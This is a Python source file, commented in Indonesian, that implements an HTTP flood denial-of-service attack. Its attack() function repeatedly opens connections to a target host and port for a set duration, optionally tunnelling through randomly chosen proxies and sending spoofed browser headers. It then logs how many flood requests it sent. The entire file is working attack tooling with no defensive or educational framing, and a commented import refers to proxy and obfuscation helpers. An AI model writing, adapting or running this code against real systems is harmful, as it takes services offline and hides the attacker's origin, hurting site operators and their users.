import socket
import ssl
import time
import logging
import random
import threading  # Import threading
#from utils import proxy, adaptive, obfuscation

log = logging.getLogger(__name__)


def attack(target, port, duration, method="GET", path="/", proxies=None, headers=None, body=None):
    start_time = time.time()
    end_time = start_time + duration
    requests_sent = 0

    # Default headers (jika tidak disediakan)
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",  # Keep-alive untuk reuse koneksi (jika memungkinkan)
    }

    request_headers = default_headers.copy()  # Copy default headers
    if headers:
        # Parse custom headers (format: "Header-Name: Value")
        for header in headers:
            try:
                name, value = header.split(":", 1)
                request_headers[name.strip()] = value.strip()
            except ValueError:
                log.warning(f"Invalid header format: {header}")
                continue  # Skip header yang tidak valid

    # Buat request HTTP
    request = f"{method} {path} HTTP/1.1\r\n"
    request += f"Host: {target}\r\n"
    for name, value in request_headers.items():
        request += f"{name}: {value}\r\n"

    if body:
        request += f"Content-Length: {len(body)}\r\n"  # Tambahkan Content-Length jika ada body
        request += "\r\n"  # Header dan body dipisahkan oleh baris kosong
        request += body
    else:
        request += "\r\n"  # Akhiri header dengan baris kosong


    try:
        while time.time() < end_time:
            try:
                # Pilih proxy secara acak (jika ada)
                current_proxy = random.choice(proxies) if proxies else None
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                # Handle HTTPS (port 443)
                if port == 443:
                    context = ssl.create_default_context()
                    s = context.wrap_socket(s, server_hostname=target)

                if current_proxy:
                    proxy_host, proxy_port = current_proxy.split(":")
                    proxy_port = int(proxy_port)
                    log.debug(f"Connecting to {target}:{port} via proxy {proxy_host}:{proxy_port}")
                    s.connect((proxy_host, proxy_port))
                    # Kirim CONNECT request untuk tunneling (HTTP dan HTTPS)
                    connect_request = f"CONNECT {target}:{port} HTTP/1.1\r\nHost: {target}\r\n\r\n"
                    s.sendall(connect_request.encode())

                    # Terima response dari proxy (untuk CONNECT)
                    response = s.recv(4096)
                    if response:
                         # Periksa status code (harus 200 OK untuk tunneling)
                        status_line = response.split(b'\r\n')[0]
                        try:
                            http_version, status_code, reason_phrase = status_line.split(b' ', 2)
                            status_code = int(status_code)
                            if status_code != 200:
                                log.warning(f"Proxy {current_proxy} returned status code {status_code} for CONNECT request. Skipping proxy.")
                                s.close()
                                continue  # Coba proxy lain atau serang langsung
                        except ValueError:
                            log.warning(f"Invalid response from Proxy, received: {response.decode(errors='ignore')}") #Ignore invalid byte
                            continue

                else: #Tidak pakai proxy
                    log.debug(f"Connecting directly to {target}:{port}")
                    s.connect((target, port))


                s.sendall(request.encode())  # Kirim request
                #s.recv(4096) #Tidak perlu di recv.
                requests_sent += 1

            except socket.error as e:
                log.error(f"Socket error: {e}")
                # Handle socket errors (misalnya, connection refused)
                # Mungkin coba lagi, atau ganti proxy, atau hentikan serangan.
                continue #Coba lagi
            except ssl.SSLError as e:
                log.error(f"SSL error: {e}")
                continue
            except Exception as e:
                log.exception(f"An unexpected error occurred: {e}")
                break
            finally:
                if 's' in locals() and s: #Close socket
                  s.close()
    except KeyboardInterrupt:
        pass
    finally:

        log.info(f"HTTP flood attack finished. Sent {requests_sent} requests.")